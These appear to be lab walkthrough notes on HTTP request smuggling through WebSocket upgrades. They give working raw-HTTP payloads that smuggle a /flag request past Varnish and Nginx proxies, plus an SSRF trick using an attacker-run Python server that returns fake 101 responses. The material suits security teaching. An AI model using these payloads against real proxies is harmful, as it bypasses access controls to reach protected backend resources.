# Request Smuggling - WebSockets

## TASK 2 Websockets

What is a WebSocket?

    When using HTTP, the client must make a request before the server can send any information. 
    This complicates the implementation of some application features that require bidirectional communications. 
    For example, suppose you are implementing a web application that needs to send real-time notifications to the user. 
    Since the server can't push information to the user at will, the client would need to constantly poll the server for notifications, requiring lots of wasted requests.
    
    The WebSocket protocol allows the creation of two-way communication channels between a browser and a server by establishing a long-lasting connection that can be used for full-duplex communications.

Upgrading HTTP connections to Websockets

    The WebSocket protocol was designed to be fully compatible with HTTP. 
    Establishing a WebSocket connection follows a process similar to that of h2c (see the HTTP/2 request smuggling room for details). 
    The client sends an initial HTTP request with an Upgrade: websocket header and other additional headers. 
    If the server supports WebSockets, it responds with a 101 Switching Protocols response and upgrades the connection accordingly. 
    From that point onwards, the connection uses the WebSocket protocol instead of HTTP.

WebSocket upgrade handshake

    If we now add a proxy in the middle, something interesting happens: Instead of fronting the connections themselves, most proxies won't handle the upgrade but will instead relay them to the backend server. 
    Once the connection is upgraded, the proxy will establish a tunnel between the client and server, so any further WebSocket traffic is forwarded without interruptions.

WebSocket upgrade through a proxy

    The problem we now face is that the tunnel uses the WebSocket protocol instead of HTTP. 
    If we were to attempt to smuggle an HTTP request using this tunnel, the backend server would reject it as it expects WebSocket requests.

## TASK n Abusing Websockets for Request Smuggling

Smuggling HTTP requests through broken WebSocket Tunnels

    To exploit vulnerable proxies, send a WebSocket upgrade request with an invalid Sec-WebSocket-Version header (e.g., not 13). 
    The backend will reject the upgrade (426 error), but the proxy may still tunnel subsequent HTTP requests, allowing you to bypass proxy restrictions and access protected resources.

Bypassing Proxy Restrictions

    The app at http://10.81.172.238:8001/flag is behind a Varnish proxy. 
    Direct access to /flag returns a Varnish error, while other invalid paths return different errors, suggesting the proxy blocks /flag. 
    There is a WebSocket endpoint at /socket that we can exploit. 
    Note the two newlines at the end of the payload.
    Two newlines after the headers signal the end of an HTTP request. 
    This is needed so the proxy and backend parse the smuggled /flag request correctly.
    Try sending the following payload to smuggle a request for /flag via a broken WebSocket connection:

        ```
        GET /socket HTTP/1.1
        Host: 10.81.172.238:8001
        Sec-WebSocket-Version: 777
        Upgrade: WebSocket
        Connection: Upgrade
        Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

        GET /flag HTTP/1.1
        Host: 10.81.172.238:8001


        ```

    Use Burp's Repeater to send the request. 
    Disable the "Update Content-Length" setting to prevent Burp from altering the payload.

    Send the payload with two newlines at the end. 
    You should receive a 426 error from the WebSocket upgrade attempt.

    After this, the proxy tunnels the rest of the connection, including your smuggled /flag request, directly to the backend server.

What if the App Doesn't Speak WebSocket?

    Some proxies don't require a real WebSocket endpoint for this technique. You just need to make the proxy think you're upgrading to WebSocket. For example, try sending this payload (add two newlines after it in Burp):

        ```
        GET / HTTP/1.1
        Host: 10.81.172.238:8001
        Sec-WebSocket-Version: 13
        Upgrade: WebSocket
        Connection: Upgrade
        Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

        GET /flag HTTP/1.1
        Host: 10.81.172.238:8001
        ```

    This payload works even if / isn't a WebSocket endpoint. 
    The proxy doesn't check the upgrade response, so any upgrade-like payload may succeed.

    Note: In Burp, this may fail randomly—retry or use nc for reliable results (include trailing newlines).

## TASK 4 Defeating Secure Proxies

Upgrading our Proxy

    So far, we've used a proxy that doesn't check the server's response for WebSocket upgrades.
    Now, we switch to an Nginx proxy that verifies upgrade responses before tunneling.
    The backend still has /socket for WebSockets and /flag as the target.

    Access the new app at http://10.81.172.238:8002/.
    Try the previous payload to see if it works.
    Nginx blocks the flag even after a 426 response to the upgrade attempt.
    Nginx checks the upgrade response code and blocks smuggling if no valid WebSocket is established.
    Trying the second payload from before gives the same result.

Tricking the Proxy

    Since we can't smuggle requests directly, we must trick the proxy into thinking a valid WebSocket connection exists.
    We need the backend to reply with a fake 101 Switching Protocols response to our upgrade request.
    If the app lets us proxy requests to a server we control, we can inject a 101 response.
    In these cases, we can smuggle requests through a fake WebSocket connection.

Leveraging SSRF

    In this task, we exploit an SSRF vulnerability to fake a WebSocket upgrade.
    The app lets us test a URL, sending a request to http://10.81.172.238:8002/check-url?server=<url> and returning the status code.
    We use nc on our AttackBox to see if we can receive a request from the server.

    AttackBox
    ```
    user@attackbox$ nc -lvp 5555
    Listening on 0.0.0.0 5555
    Connection received on 10.81.172.238 52988
    GET /test HTTP/1.1
    Host: 10.10.11.155:5555
    User-Agent: python-requests/2.31.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    ```

    We can use the SSRF vulnerability to control the backend server's response.
    Spin up a web server that returns a 101 status to fake a WebSocket upgrade.

Setting up the Attacker's Web Server

    We can quickly set up a web server that responds with status 101 to every request with the following Python code:

    ```
    import sys
    from http.server import HTTPServer, BaseHTTPRequestHandler

    if len(sys.argv)-1 != 1:
        print("""
    Usage: {} 
        """.format(sys.argv[0]))
        sys.exit()

    class Redirect(BaseHTTPRequestHandler):
        def do_GET(self):
            self.protocol_version = "HTTP/1.1"
            self.send_response(101)
            self.end_headers()

    HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
    ```

    Let's save the code to a file named myserver.py in our AttackBox and run it with the following command:

    AttackBox
    ```
    user@attackbox$ python3 myserver.py 5555
    ```
    This should spin up a web server on port 5555 that will reply with a 101 status code to any request.

Faking a WebSocket

    We are ready to launch our payload.
    Use Burp's Repeater to send a request to /check-url against our malicious server.
    The request should look like this:

    ```
    GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
    Host: 10.81.172.238:8002
    Sec-WebSocket-Version: 13
    Upgrade: WebSocket
    Connection: Upgrade
    Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

    GET /flag HTTP/1.1
    Host: 10.81.172.238:8002


    ```

    If successful, your malicious server receives a request and Burp shows the flag (ensure two newlines at the end).  
    /Check-url is not a WebSocket endpoint; we trick the proxy with crafted requests and responses.  
    The proxy tunnels the second request as WebSocket traffic, but the backend processes it as HTTP.

## Appendix: